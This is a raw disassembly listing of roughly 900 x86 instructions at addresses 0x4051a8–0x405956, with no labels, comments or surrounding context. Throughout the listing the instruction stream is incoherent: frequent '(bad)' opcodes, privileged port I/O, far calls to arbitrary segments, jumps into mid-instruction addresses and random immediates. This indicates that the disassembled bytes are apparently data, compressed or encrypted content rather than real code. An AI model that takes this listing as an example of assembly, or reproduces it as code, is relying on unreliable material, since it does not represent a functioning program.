  4051a8:	jno    0x405199
  4051aa:	xchg   ecx,eax
  4051ab:	popf   
  4051ac:	sub    eax,0xe9366b57
  4051b1:	addr16 add esi,ebx
  4051b4:	mov    cl,0x1b
  4051b6:	retf   0xae83
  4051b9:	ins    DWORD PTR es:[edi],dx
  4051ba:	pop    ds
  4051bb:	or     bl,BYTE PTR [eax-0x2888c565]
  4051c1:	(bad)  
  4051c2:	fist   WORD PTR [eax]
  4051c4:	push   edx
  4051c5:	repnz aam 0xff
  4051c8:	push   0xf68d41ca
  4051cd:	idiv   DWORD PTR [ebp-0x36c0976b]
  4051d3:	add    al,0xa4
  4051d5:	pop    esp
  4051d6:	xchg   ecx,eax
  4051d7:	dec    edi
  4051d8:	add    cl,cl
  4051da:	or     ebx,DWORD PTR [edi-0x6ce88af8]
  4051e0:	cld    
  4051e1:	ret    0xcd84
  4051e4:	ret    0x3f3
  4051e7:	pusha  
  4051e8:	jg     0x4051f5
  4051ea:	jecxz  0x4051fb
  4051ec:	dec    eax
  4051ed:	sbb    ebp,esp
  4051ef:	out    dx,al
  4051f0:	xlat   BYTE PTR ds:[ebx]
  4051f1:	(bad)  
  4051f2:	daa    
  4051f3:	add    esp,DWORD PTR [ecx+0x6ce649bc]
  4051f9:	push   esi
  4051fa:	jns    0x4051bc
  4051fc:	loop   0x4051ae
  4051fe:	sub    BYTE PTR [esi+0x93f4e61],cl
  405204:	daa    
  405205:	stos   DWORD PTR es:[edi],eax
  405206:	jns    0x4051dc
  405208:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40520a:	fidivr WORD PTR [ecx]
  40520c:	mov    al,0xd7
  40520e:	xor    edx,DWORD PTR [edi]
  405210:	rcl    BYTE PTR ds:0x34f47c83,1
  405216:	push   0x9b9a3bfd
  40521b:	dec    ecx
  40521c:	cwde   
  40521d:	scas   eax,DWORD PTR es:[edi]
  40521e:	adc    eax,0x24348fae
  405223:	out    0xbd,eax
  405225:	push   0xac0c26ad
  40522a:	into   
  40522b:	pop    esp
  40522c:	pop    esi
  40522d:	outs   dx,DWORD PTR ds:[esi]
  40522e:	ins    DWORD PTR es:[edi],dx
  40522f:	sbb    dl,BYTE PTR [eax]
  405231:	push   ds
  405232:	mov    bl,0x3d
  405234:	arpl   WORD PTR [edi],cx
  405236:	mov    BYTE PTR [edx+0x67],dl
  405239:	push   ecx
  40523a:	pushf  
  40523b:	or     al,0x90
  40523d:	add    DWORD PTR [ecx-0x4008ce76],0xffffffda
  405244:	js     0x405263
  405246:	loopne 0x4051f0
  405248:	dec    esi
  405249:	inc    ebp
  40524a:	in     eax,0xec
  40524c:	xor    al,0x2d
  40524e:	xchg   esi,eax
  40524f:	push   0x29dcb126
  405254:	repnz cmp ecx,ecx
  405257:	and    BYTE PTR [ebx-0x21779beb],bl
  40525d:	jo     0x40529e
  40525f:	fst    DWORD PTR [edi-0x5f]
  405262:	jne    0x4052bc
  405264:	outs   dx,BYTE PTR ds:[esi]
  405265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405266:	in     eax,dx
  405267:	je     0x4052d3
  405269:	inc    esi
  40526a:	stos   DWORD PTR es:[edi],eax
  40526b:	out    0xcb,eax
  40526d:	ja     0x405260
  40526f:	cmp    al,ch
  405271:	and    al,0x5b
  405273:	arpl   WORD PTR [ebp+0x34577ac1],sp
  405279:	push   esi
  40527a:	retf   0x717
  40527d:	mov    cl,0x32
  40527f:	add    BYTE PTR [edi],ch
  405281:	mov    eax,0xe3985b85
  405286:	mov    bl,0xc3
  405288:	inc    BYTE PTR ds:0xac208b52
  40528e:	sub    ecx,DWORD PTR [ecx+0x6a]
  405291:	(bad)  
  405292:	and    esp,eax
  405294:	and    al,0x7a
  405296:	and    DWORD PTR [edx-0x38],eax
  405299:	in     eax,dx
  40529a:	push   cs
  40529b:	shr    bl,0x4b
  40529e:	shl    BYTE PTR [ebx-0x4f],cl
  4052a1:	int3   
  4052a2:	jo     0x4052ab
  4052a4:	lds    edi,FWORD PTR ds:[ecx]
  4052a7:	push   ss
  4052a8:	dec    edx
  4052a9:	mov    edi,0x7874782
  4052ae:	fst    st(3)
  4052b0:	pop    ecx
  4052b1:	fidivr WORD PTR [esp+ebp*4]
  4052b4:	mov    DWORD PTR [edx],0x2d9dd4b3
  4052ba:	dec    edx
  4052bb:	mov    BYTE PTR [eax],ah
  4052bd:	sbb    al,0x9d
  4052bf:	jle    0x4052fa
  4052c1:	jmp    0x443c6d1a
  4052c6:	pop    esp
  4052c7:	sbb    ebp,eax
  4052c9:	mul    DWORD PTR [esp+edx*2]
  4052cc:	mov    ds:0xfc6e058a,eax
  4052d1:	dec    ebp
  4052d2:	(bad)  
  4052d4:	mov    eax,ds:0xe32e844b
  4052d9:	das    
  4052da:	stos   DWORD PTR es:[edi],eax
  4052db:	inc    edx
  4052dc:	out    0xa5,al
  4052de:	inc    ebx
  4052df:	jb     0x4052c0
  4052e1:	fdiv   DWORD PTR [di]
  4052e4:	ss mov esi,0xc5ff0546
  4052ea:	push   edx
  4052eb:	mov    DWORD PTR [eax-0x629deb21],ecx
  4052f1:	pushf  
  4052f2:	pusha  
  4052f3:	nop
  4052f4:	cli    
  4052f5:	out    dx,eax
  4052f6:	sbb    al,0x84
  4052f8:	push   esi
  4052f9:	es adc al,0xc6
  4052fc:	mov    bl,0xe1
  4052fe:	cmp    al,0x34
  405300:	mov    dl,0x7a
  405302:	adc    edi,DWORD PTR [edi]
  405304:	ins    BYTE PTR es:[edi],dx
  405305:	mov    esp,0x1a611ac0
  40530a:	repnz or al,0x30
  40530d:	xchg   edx,eax
  40530e:	xor    eax,0x27037f66
  405313:	(bad)  
  405315:	icebp  
  405316:	adc    al,0xe8
  405318:	adc    al,0x45
  40531a:	adc    al,0xc6
  40531c:	imul   edx,DWORD PTR [ecx],0x62
  40531f:	inc    ecx
  405320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405321:	and    DWORD PTR [edx-0x29],edi
  405324:	ins    DWORD PTR es:[edi],dx
  405325:	rep stos DWORD PTR es:[edi],eax
  405327:	ficom  WORD PTR [ebx+0x6e0c4a75]
  40532d:	lods   eax,DWORD PTR ds:[esi]
  40532e:	cmc    
  40532f:	pop    ebx
  405330:	xor    eax,0xb8e7bd60
  405335:	test   eax,0x14971cee
  40533a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40533b:	lods   eax,DWORD PTR ds:[esi]
  40533c:	fstp   QWORD PTR [ebx+edx*4-0x69]
  405340:	xor    al,0xd7
  405342:	xor    al,0xaf
  405344:	sbb    cl,BYTE PTR ds:[edi+0x46f4b6a3]
  40534b:	jae    0x40532c
  40534d:	xor    eax,0x2a53cf73
  405352:	lods   al,BYTE PTR ds:[esi]
  405353:	dec    esp
  405354:	fimul  DWORD PTR [ebx]
  405356:	jmp    0xc5883e36
  40535b:	cdq    
  40535c:	popa   
  40535d:	neg    DWORD PTR [ebx]
  40535f:	stc    
  405360:	mov    al,0xda
  405362:	data16 out dx,al
  405364:	test   al,0xa7
  405366:	pushf  
  405367:	mul    BYTE PTR [ebx]
  405369:	cmp    DWORD PTR [ecx+0x78273621],0xffffff9e
  405370:	adc    bh,BYTE PTR ds:[ecx+0x16]
  405374:	inc    edx
  405375:	dec    ebx
  405376:	stc    
  405377:	xor    al,0x48
  405379:	push   cs
  40537a:	std    
  40537b:	cli    
  40537c:	sbb    al,0xb8
  40537e:	int    0xa5
  405380:	call   0xa08d:0xe8c8810e
  405387:	adc    ebx,ebp
  405389:	(bad)  
  40538a:	pusha  
  40538b:	not    BYTE PTR [ecx]
  40538d:	addr16 int 0x86
  405390:	(bad)  
  405391:	(bad)  
  405393:	pusha  
  405394:	mov    WORD PTR [edx],?
  405396:	xor    cl,BYTE PTR [ecx]
  405398:	mov    ch,0xc4
  40539a:	mov    ebp,0xdc91251c
  40539f:	lock mov ch,BYTE PTR [ebp-0x5adc19da]
  4053a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053a7:	shl    esp,0xd8
  4053aa:	sub    eax,0x7a43652b
  4053af:	push   edi
  4053b0:	mov    dh,0xb5
  4053b2:	cmp    BYTE PTR ds:0xd019a9a1,dh
  4053b8:	fisttp WORD PTR [ecx-0xe]
  4053bb:	adc    ecx,DWORD PTR [edx+edi*4+0x5d]
  4053bf:	pop    es
  4053c0:	and    al,0x70
  4053c2:	mov    bh,0x59
  4053c4:	out    0x5e,eax
  4053c6:	ficomp DWORD PTR [edi+esi*2]
  4053c9:	sub    al,al
  4053cb:	(bad)  
  4053cc:	nop
  4053cd:	imul   ebp,esi,0xffffffe2
  4053d0:	rcl    cl,0x69
  4053d3:	sub    BYTE PTR [ebx-0x156ae83b],dl
  4053d9:	mov    eax,ds:0x91d71eca
  4053de:	pop    esi
  4053df:	aaa    
  4053e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053e1:	into   
  4053e2:	ret    0x8a1c
  4053e5:	pop    ebp
  4053e6:	rcl    DWORD PTR [esi],0x8c
  4053e9:	or     eax,0x9d9b34a5
  4053ee:	mov    bh,BYTE PTR [ecx]
  4053f0:	and    esp,ebx
  4053f2:	fs push 0x450c2a79
  4053f8:	pushf  
  4053f9:	lds    ecx,FWORD PTR [ebx+0x24043e7e]
  4053ff:	dec    edi
  405400:	es add al,0x5c
  405403:	pop    ds
  405404:	daa    
  405405:	iret   
  405406:	jmp    0x64c05ca7
  40540b:	add    al,0x7f
  40540d:	ret    0x1385
  405410:	or     eax,0x1696c91b
  405415:	mov    esp,0x6f58fb75
  40541a:	pop    edx
  40541b:	in     eax,dx
  40541c:	mov    cl,0x31
  40541e:	xchg   esi,eax
  40541f:	or     cl,BYTE PTR [eax-0x3a]
  405422:	test   BYTE PTR [edx],bh
  405424:	jge    0x4053e1
  405426:	call   0xba83:0x859f6510
  40542d:	push   ebp
  40542e:	jmp    0x40541e
  405430:	mov    ebx,0xba8d329f
  405435:	scas   al,BYTE PTR es:[edi]
  405436:	retf   
  405437:	add    ch,BYTE PTR [ebx]
  405439:	jp     0x40543b
  40543b:	jge    0x4053de
  40543d:	cmc    
  40543e:	and    BYTE PTR [eax+0x4920585b],0x4e
  405445:	loop   0x40544d
  405447:	pop    edi
  405448:	or     bl,ah
  40544a:	mov    ds:0x49f1a40,al
  40544f:	add    eax,0x11604516
  405454:	aaa    
  405455:	mov    esi,0xa08964b6
  40545a:	(bad)  
  40545b:	jmp    0x405410
  40545d:	jmp    0x89a8:0xc8e35841
  405464:	aas    
  405465:	out    dx,eax
  405466:	loopne 0x4053f0
  405468:	or     DWORD PTR [ecx],ebx
  40546a:	popf   
  40546b:	(bad)  
  40546c:	int3   
  40546d:	rol    DWORD PTR [ebx],1
  40546f:	mov    ds:0xf4bdb2e1,al
  405474:	sub    al,0x19
  405476:	sub    al,0x32
  405478:	mov    ebx,0xca1c62b4
  40547d:	jns    0x405498
  40547f:	loop   0x4054ca
  405481:	dec    edi
  405482:	(bad)  
  405484:	imul   DWORD PTR [esi-0x114e3797]
  40548a:	mov    ah,0x30
  40548c:	bound  ebx,QWORD PTR [ebx]
  40548e:	mov    eax,ds:0xa90526
  405493:	aam    0xaa
  405495:	xchg   ecx,eax
  405496:	test   al,0x9b
  405498:	cmp    al,0x8a
  40549a:	(bad)  
  40549b:	paddd  mm7,mm0
  40549e:	xlat   BYTE PTR ds:[ebx]
  40549f:	adc    dh,BYTE PTR [edx+0x24]
  4054a2:	sbb    ch,BYTE PTR [ecx]
  4054a4:	cli    
  4054a5:	add    al,0x7c
  4054a7:	xchg   esi,eax
  4054a8:	xchg   bl,ah
  4054aa:	cld    
  4054ab:	ret    
  4054ac:	mov    ebp,0x62edf4ab
  4054b1:	jl     0x40545d
  4054b3:	jge    0x405495
  4054b5:	aam    0x60
  4054b7:	dec    ebx
  4054b8:	sub    al,dh
  4054ba:	imul   esi,DWORD PTR [ebx],0x63
  4054bd:	adc    DWORD PTR ds:0x43e8b331,eax
  4054c3:	jbe    0x4054c5
  4054c5:	mov    ebp,0x30720da2
  4054ca:	sbb    al,0xc6
  4054cc:	iret   
  4054cd:	mov    ch,0x90
  4054cf:	dec    edx
  4054d0:	ins    DWORD PTR es:[edi],dx
  4054d1:	pop    ds
  4054d2:	mov    cl,0x9a
  4054d4:	mov    al,0xf4
  4054d6:	and    al,0xc2
  4054d8:	repnz loope 0x4054a9
  4054db:	and    DWORD PTR [eax-0x61],edi
  4054de:	inc    ebp
  4054df:	shl    edx,0xc9
  4054e2:	sub    eax,0x39a011ec
  4054e7:	add    al,BYTE PTR [eax+edx*8-0x60]
  4054eb:	stc    
  4054ec:	sub    dh,BYTE PTR [ebx+0x5b]
  4054ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054f0:	cs js  0x405515
  4054f3:	cmp    edx,ebx
  4054f5:	cmp    ecx,esp
  4054f7:	inc    edx
  4054f8:	jl     0x405540
  4054fa:	adc    BYTE PTR [ebx-0x30],al
  4054fd:	dec    edx
  4054fe:	jge    0x4054bc
  405500:	mov    edi,0x8265c1d6
  405505:	pop    edx
  405506:	int    0xd7
  405508:	push   edx
  405509:	add    edi,DWORD PTR [ecx]
  40550b:	sbb    DWORD PTR [ebp-0x3],esp
  40550e:	imul   edx,DWORD PTR [ebx+0x7f],0xb75c2d52
  405515:	popa   
  405516:	dec    esi
  405517:	mov    eax,0x5f77be4f
  40551c:	inc    edx
  40551d:	inc    ebp
  40551e:	syscall 
  405520:	jl     0x40552e
  405522:	es out dx,eax
  405524:	xor    eax,DWORD PTR [ecx-0x1]
  405527:	push   0x32584d7e
  40552c:	nop
  40552d:	fisubr WORD PTR [esi-0x7d367703]
  405533:	div    BYTE PTR [esp+ecx*1]
  405536:	push   es
  405537:	mov    ah,0xc1
  405539:	mov    ch,0x2
  40553b:	or     al,BYTE PTR [edx-0x46f4b74c]
  405541:	gs (bad) 
  405543:	mov    edi,0xaaa1d612
  405548:	and    ch,BYTE PTR [esi+0x5add10]
  40554e:	mov    bl,0xd6
  405550:	jmp    0x4055b9
  405552:	mov    ds:0xb93b6ec0,eax
  405557:	in     eax,0xb
  405559:	icebp  
  40555a:	ins    DWORD PTR es:[edi],dx
  40555b:	aaa    
  40555c:	(bad)  
  40555d:	dec    eax
  40555e:	mov    ds:0xc6b9ab10,al
  405563:	clc    
  405564:	outs   dx,BYTE PTR ds:[esi]
  405565:	int3   
  405566:	or     DWORD PTR [ebx],ebx
  405568:	push   edx
  405569:	mov    esi,0x18c21f9f
  40556e:	add    al,0x2e
  405570:	loope  0x40557a
  405572:	mov    ch,0x23
  405574:	and    dh,ah
  405576:	cmp    dh,BYTE PTR [ecx-0x5067a3d1]
  40557c:	xchg   ebx,eax
  40557d:	ror    DWORD PTR [eax+0x7030d276],0xbd
  405584:	inc    edx
  405585:	fst    QWORD PTR [ebx]
  405587:	sti    
  405588:	mov    ds:0x8fb95a59,eax
  40558d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40558e:	(bad)  
  40558f:	ja     0x4055be
  405591:	in     al,dx
  405592:	mov    eax,0x34a5a6b9
  405597:	xor    bl,bh
  405599:	outs   dx,BYTE PTR ds:[esi]
  40559a:	das    
  40559b:	sar    DWORD PTR [ebx-0x7b80f574],cl
  4055a1:	xchg   ecx,eax
  4055a2:	stc    
  4055a3:	cmp    DWORD PTR [ebp+ecx*8+0x5fbe8ac7],0xffffff93
  4055ab:	mov    ebp,esp
  4055ad:	xchg   DWORD PTR [edx-0x4f69ba75],edx
  4055b3:	jae    0x4055c5
  4055b5:	dec    ecx
  4055b6:	test   eax,0xab93de38
  4055bb:	adc    al,dl
  4055bd:	imul   edi,DWORD PTR [ecx],0x5bea14e3
  4055c3:	test   BYTE PTR [esi],bl
  4055c5:	and    BYTE PTR fs:[esi-0x2c],0xbe
  4055ca:	or     DWORD PTR [edx-0x1c8e57ff],0xffffffa1
  4055d1:	jno    0x40556d
  4055d3:	jno    0x4055b8
  4055d5:	mov    BYTE PTR [esi-0x22e6794d],ch
  4055db:	cmp    BYTE PTR [edi+eax*4],cl
  4055de:	inc    esp
  4055df:	sub    DWORD PTR [esi],ebp
  4055e1:	or     al,0x95
  4055e3:	jmp    0x12c1:0x77b8eed8
  4055ea:	int    0xf8
  4055ec:	fsub   DWORD PTR [ebp+0x39]
  4055ef:	push   0xedc20f2f
  4055f4:	pop    esi
  4055f5:	push   edx
  4055f6:	pushf  
  4055f7:	xchg   esp,eax
  4055f8:	arpl   WORD PTR [edx+edi*1-0x45],cx
  4055fc:	dec    edi
  4055fd:	xchg   esp,eax
  4055fe:	jmp    0x4055dc
  405600:	or     BYTE PTR [ebx],ch
  405602:	jns    0x4055f7
  405604:	cmc    
  405605:	jle    0x405637
  405607:	inc    esi
  405608:	and    bl,BYTE PTR [ecx]
  40560a:	sbb    cl,dh
  40560c:	mov    esi,edi
  40560e:	mov    ah,0x1a
  405610:	and    dl,ah
  405612:	psraw  mm1,QWORD PTR [ecx-0xf5c463b]
  405619:	xor    DWORD PTR [ebx-0x16],edx
  40561c:	cmp    DWORD PTR [ecx-0x575aa81b],ebp
  405622:	ins    DWORD PTR es:[edi],dx
  405623:	sub    ecx,DWORD PTR [ecx]
  405625:	mov    ecx,DWORD PTR [edi]
  405627:	or     esp,ecx
  405629:	jp     0x4055ac
  40562b:	fnstcw WORD PTR [ebx]
  40562d:	fld    QWORD PTR [ebx]
  40562f:	adc    edx,ebp
  405631:	cmp    eax,ecx
  405633:	fs in  al,dx
  405635:	arpl   WORD PTR [ebx+ebp*8],di
  405638:	stos   DWORD PTR es:[edi],eax
  405639:	cdq    
  40563a:	ins    DWORD PTR es:[edi],dx
  40563b:	out    0xd4,al
  40563d:	mul    BYTE PTR ds:0x6bc68efe
  405643:	xor    BYTE PTR [ecx+0x5c],dl
  405646:	xchg   ecx,eax
  405647:	inc    ebx
  405648:	and    eax,0xf540f899
  40564d:	dec    esp
  40564e:	shr    DWORD PTR [edi],0xea
  405651:	les    esi,FWORD PTR [edx-0x1e]
  405654:	lea    eax,[eax]
  405656:	mov    eax,0x2011c267
  40565b:	hlt    
  40565c:	fsub   DWORD PTR [eax-0x465a0753]
  405662:	adc    cl,bh
  405664:	mov    eax,ds:0xe93c85c9
  405669:	out    0x6e,eax
  40566b:	mov    ds:0x59fafde3,eax
  405670:	fcom   QWORD PTR [ebp+0x6f]
  405673:	pusha  
  405674:	lods   al,BYTE PTR ds:[esi]
  405675:	cmp    edx,DWORD PTR [edi+0x7c]
  405678:	cmp    ah,0xc
  40567b:	add    DWORD PTR [edi-0x3bf4a52a],ebp
  405681:	ds leave 
  405683:	clc    
  405684:	sbb    al,0xa8
  405686:	sub    DWORD PTR [eax-0x214c79cd],ebp
  40568c:	das    
  40568d:	test   eax,0x3df0abb3
  405692:	lods   eax,DWORD PTR ds:[esi]
  405693:	push   ss
  405694:	outs   dx,DWORD PTR ds:[esi]
  405695:	idiv   DWORD PTR [edx]
  405697:	in     eax,dx
  405698:	(bad)  
  405699:	ret    
  40569a:	and    eax,0x5a9ab712
  40569f:	shl    BYTE PTR [eax+0x4a],1
  4056a2:	fdiv   DWORD PTR [edx-0x66]
  4056a5:	in     eax,dx
  4056a6:	cdq    
  4056a7:	xchg   esi,eax
  4056a8:	and    ebx,DWORD PTR [ebx+0x718e009f]
  4056ae:	sub    ebx,DWORD PTR [esi-0x3b]
  4056b1:	and    al,0x64
  4056b3:	or     eax,0xa90020a3
  4056b8:	sub    edx,edi
  4056ba:	xor    al,0x17
  4056bc:	in     al,0xf9
  4056be:	jecxz  0x40568a
  4056c0:	and    al,0xd9
  4056c2:	call   0xfad6:0x935ec698
  4056c9:	imul   esi,DWORD PTR [ebp-0x4dfbaaf],0x5214d69c
  4056d3:	push   eax
  4056d4:	mov    al,ds:0xb5bb654f
  4056d9:	mov    ebx,0xede320a3
  4056de:	bound  eax,QWORD PTR [bp+si-0x10c4]
  4056e3:	sub    esi,DWORD PTR [eax]
  4056e5:	out    dx,al
  4056e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056e7:	aam    0x8c
  4056e9:	rcr    DWORD PTR [edx+ecx*8+0x1a6cee3c],1
  4056f0:	xor    DWORD PTR [eax],0x55e6c68c
  4056f6:	mul    BYTE PTR [edi]
  4056f8:	out    0x75,eax
  4056fa:	mov    DWORD PTR [esi-0x6f],edi
  4056fd:	fidivr DWORD PTR [ebp+ecx*1+0x7a]
  405701:	push   ds
  405702:	xchg   edi,eax
  405703:	(bad)  
  405704:	fdivr  DWORD PTR [ebp-0x7a7c2486]
  40570a:	popa   
  40570b:	test   al,0x46
  40570d:	and    al,cl
  40570f:	sub    ch,dh
  405711:	xor    BYTE PTR [eax+0x5febe998],bh
  405717:	retf   
  405718:	popf   
  405719:	aam    0xab
  40571b:	test   DWORD PTR [edi-0x52],0xa308d585
  405722:	sub    dl,BYTE PTR [edx-0x29900dbd]
  405728:	scas   al,BYTE PTR es:[edi]
  405729:	jp     0x40574a
  40572b:	and    al,0xed
  40572d:	mov    bl,0xbb
  40572f:	retf   0x972b
  405732:	mov    al,BYTE PTR [esi+0x1a75103d]
  405738:	cmp    DWORD PTR [ebx],eax
  40573a:	pop    es
  40573b:	xchg   bl,al
  40573d:	stos   DWORD PTR es:[edi],eax
  40573e:	ja     0x4057a4
  405740:	dec    ecx
  405741:	push   cs
  405742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405743:	or     ch,BYTE PTR [edx+0x34]
  405746:	xchg   ebp,eax
  405747:	(bad)  
  405748:	mov    ah,0x6d
  40574a:	das    
  40574b:	jne    0x405784
  40574d:	hlt    
  40574e:	mov    edx,0x828c03cd
  405753:	adc    DWORD PTR [ebx],0x383527ba
  405759:	mov    dh,0xbb
  40575b:	pushf  
  40575c:	xor    ch,dh
  40575e:	mov    BYTE PTR [edx-0x28],dh
  405761:	fist   DWORD PTR [ebp-0x161597ec]
  405767:	shl    BYTE PTR [ebp-0xb],cl
  40576a:	jnp    0x4057da
  40576c:	js     0x40574d
  40576e:	sub    ebp,ebp
  405770:	retf   
  405771:	fisubr DWORD PTR [ecx+edx*1]
  405774:	out    dx,al
  405775:	sbb    ebx,DWORD PTR [edi]
  405777:	ins    DWORD PTR es:[edi],dx
  405778:	or     eax,0x46a312c5
  40577d:	shl    DWORD PTR [ebx-0x2eabea26],1
  405783:	ss mov ecx,0x13485112
  405789:	push   ss
  40578a:	lock xlat BYTE PTR ds:[ebx]
  40578c:	fidiv  DWORD PTR [ebx+eax*1]
  40578f:	cmp    DWORD PTR [eax-0x52],esp
  405792:	push   0x3a
  405794:	test   eax,0x360db7c7
  405799:	dec    eax
  40579a:	jle    0x405802
  40579c:	rcr    edx,cl
  40579e:	retf   0xa717
  4057a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057a2:	xor    BYTE PTR [esi-0x59],bh
  4057a5:	or     al,0x5a
  4057a7:	cli    
  4057a8:	loope  0x4057a3
  4057aa:	inc    ecx
  4057ab:	aas    
  4057ac:	repz ds in al,0xbd
  4057b0:	out    dx,eax
  4057b1:	pop    ebx
  4057b2:	not    DWORD PTR [ebx+0x54]
  4057b5:	pop    ebx
  4057b6:	mov    edi,0x166f22b9
  4057bb:	test   al,0xe
  4057bd:	mov    ch,0x24
  4057bf:	rcl    DWORD PTR [eax+0x13],0x79
  4057c3:	in     eax,0x2b
  4057c5:	idiv   BYTE PTR [ebp+0x31]
  4057c8:	xor    BYTE PTR [ebp-0x2c],al
  4057cb:	xchg   esi,eax
  4057cc:	pop    ebp
  4057cd:	push   ebp
  4057ce:	pop    ecx
  4057cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057d0:	leave  
  4057d1:	cmp    DWORD PTR [eax],esi
  4057d3:	jno    0x4057c0
  4057d5:	pushf  
  4057d6:	xor    DWORD PTR [ebx],esp
  4057d8:	sub    DWORD PTR [ebx-0x20],esp
  4057db:	js     0x405792
  4057dd:	add    eax,0xb42b24b6
  4057e2:	ret    
  4057e3:	loop   0x405804
  4057e5:	(bad)  
  4057e6:	pop    eax
  4057e7:	xchg   ecx,eax
  4057e8:	inc    ebx
  4057e9:	jp     0x405800
  4057eb:	pushf  
  4057ec:	sub    ebp,DWORD PTR [eax-0x4be5cd4b]
  4057f2:	sub    DWORD PTR [edi+0x4b],edi
  4057f5:	ret    
  4057f6:	inc    edi
  4057f7:	cwde   
  4057f8:	(bad)  
  4057f9:	rol    DWORD PTR [esi+eax*4+0x52b20039],cl
  405800:	dec    esp
  405801:	dec    esi
  405802:	dec    edi
  405803:	cs pop ebp
  405805:	add    esi,DWORD PTR [esi+0x5b]
  405808:	aas    
  405809:	call   0x395d1b05
  40580e:	outs   dx,BYTE PTR ds:[esi]
  40580f:	add    dl,dh
  405811:	jmp    0x19871919
  405816:	mov    eax,0xadc693ca
  40581b:	sbb    al,0xcb
  40581d:	dec    esp
  40581e:	cmp    eax,0x69a14450
  405823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405824:	not    bl
  405826:	jmp    0x40589c
  405828:	(bad)  
  405829:	shr    BYTE PTR [ebx+0x77],1
  40582c:	lods   al,BYTE PTR ds:[esi]
  40582d:	in     eax,dx
  40582e:	or     DWORD PTR [ebp-0x70f81022],esi
  405834:	imul   edi,DWORD PTR [edi+0x7b65743],0xffffffd1
  40583b:	(bad)  
  40583c:	mov    BYTE PTR [bp+si-0x2b86],bh
  405841:	lods   al,BYTE PTR ds:[esi]
  405842:	fcmovnbe st,st(5)
  405844:	sub    BYTE PTR [edi-0x6a],dl
  405847:	xchg   esi,eax
  405848:	mov    bl,0xe6
  40584a:	mov    cl,0x0
  40584c:	mov    edx,ss
  40584e:	push   ebx
  40584f:	pop    ebp
  405850:	push   eax
  405851:	push   ecx
  405852:	jmp    0x4b058ecc
  405857:	dec    ecx
  405858:	loop   0x4057df
  40585a:	sbb    DWORD PTR [ebx-0x4b],ebp
  40585d:	and    BYTE PTR [esi],cl
  40585f:	ss icebp 
  405861:	popf   
  405862:	lock call 0xc144:0x4a09bb4c
  40586a:	xchg   esp,eax
  40586b:	sbb    eax,0x88831da4
  405870:	sti    
  405871:	mov    cl,0x81
  405873:	test   eax,0xfa03691a
  405878:	in     al,dx
  405879:	jge    0x405813
  40587b:	addr16 icebp 
  40587d:	mov    cl,0x9
  40587f:	in     eax,0x77
  405881:	mov    bh,ch
  405883:	sub    BYTE PTR [esi],cl
  405885:	mov    al,0x67
  405887:	scas   eax,DWORD PTR es:[edi]
  405888:	pop    esp
  405889:	mov    ebx,0x3be2f417
  40588e:	pop    esi
  40588f:	pop    es
  405890:	daa    
  405891:	pop    edx
  405892:	mov    dl,0x32
  405894:	jne    0x4058f0
  405896:	hlt    
  405897:	in     al,0xc2
  405899:	xor    al,0xd1
  40589b:	mov    ebp,0xb23a394e
  4058a0:	sbb    bl,BYTE PTR cs:[ebx+0x759d44d5]
  4058a7:	xor    eax,eax
  4058a9:	sti    
  4058aa:	sbb    al,0x71
  4058ac:	xor    dl,BYTE PTR [edi-0x1b262eb6]
  4058b2:	inc    ebp
  4058b3:	test   BYTE PTR [ecx-0x325c3e97],al
  4058b9:	aaa    
  4058ba:	jnp    0x405891
  4058bc:	jmp    0x405852
  4058be:	pop    ss
  4058bf:	ins    BYTE PTR es:[edi],dx
  4058c0:	push   edi
  4058c1:	lods   eax,DWORD PTR ds:[esi]
  4058c2:	push   0xfffffff4
  4058c4:	pop    ds
  4058c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058c6:	cdq    
  4058c7:	ja     0x4058a5
  4058c9:	xor    al,0x2b
  4058cb:	popf   
  4058cc:	sbb    eax,0x750d3b62
  4058d1:	mov    ch,0xdf
  4058d3:	out    dx,eax
  4058d4:	fwait
  4058d5:	jno    0x405939
  4058d7:	mov    DWORD PTR ds:0x6dd4d2,ebp
  4058dd:	xor    DWORD PTR [eax+eax*8],edi
  4058e0:	or     eax,0x8a8bee0d
  4058e5:	inc    ebp
  4058e6:	loop   0x4058e5
  4058e8:	mov    esi,0x381f7160
  4058ed:	aas    
  4058ee:	shl    al,0x48
  4058f1:	jg     0x4058f9
  4058f3:	mov    eax,ds:0x49ee048d
  4058f8:	xchg   edi,eax
  4058f9:	fmul   DWORD PTR [esi-0x30dfad6d]
  4058ff:	loopne 0x40592a
  405901:	or     eax,0x4a0fe542
  405906:	into   
  405907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405908:	adc    DWORD PTR [ebx],ebp
  40590a:	dec    DWORD PTR [eax]
  40590c:	add    cl,0x5a
  40590f:	(bad)  
  405910:	in     eax,0xd5
  405912:	imul   eax,DWORD PTR [ecx],0x5e
  405915:	add    eax,0xef768d86
  40591a:	test   al,0x6b
  40591c:	push   edi
  40591d:	xchg   ebx,eax
  40591e:	dec    esi
  40591f:	xchg   esi,eax
  405920:	adc    al,0x92
  405922:	ds mov ebx,0xa87cfe6d
  405928:	xor    DWORD PTR [esi+0x13],ecx
  40592b:	in     eax,0x72
  40592d:	hlt    
  40592e:	fs test al,0xba
  405931:	and    eax,0x3a74700f
  405936:	push   edx
  405937:	xchg   ebx,eax
  405938:	add    eax,0x249a48ac
  40593d:	stos   DWORD PTR es:[edi],eax
  40593e:	lods   al,BYTE PTR ds:[esi]
  40593f:	mov    esi,0xd2c6c473
  405944:	mov    es,WORD PTR [bx+si]
  405947:	mov    al,0x6f
  405949:	rcr    BYTE PTR [ecx],1
  40594b:	cmp    BYTE PTR [esi+0x2c],bh
  40594e:	ds jae 0x405999
  405951:	or     BYTE PTR [edx],ah
  405953:	add    BYTE PTR [eax-0x2a],al
  405956:	arpl   WORD PTR [ebx],bx
